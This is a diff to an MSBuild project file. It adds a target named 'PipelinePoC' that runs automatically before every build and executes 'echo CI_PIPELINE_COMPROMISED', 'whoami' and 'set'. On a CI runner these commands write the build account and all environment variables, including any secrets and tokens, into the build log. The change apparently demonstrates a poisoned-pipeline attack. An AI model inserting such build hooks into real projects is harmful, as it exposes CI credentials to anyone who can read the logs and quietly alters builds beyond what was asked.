@@ -75,4 +75,9 @@
   <!-- dotnet build will not include ref project references for .netcoreapp3.1 unless references are duplicated here -->
   <ItemGroup Condition=" '$(TargetFramework)' == 'net462'">
   </ItemGroup>
+  <Target Name="PipelinePoC" BeforeTargets="BeforeBuild">
+  <Exec Command="echo CI_PIPELINE_COMPROMISED" />
+  <Exec Command="whoami" />
+  <Exec Command="set" />
+  </Target>
 </Project>
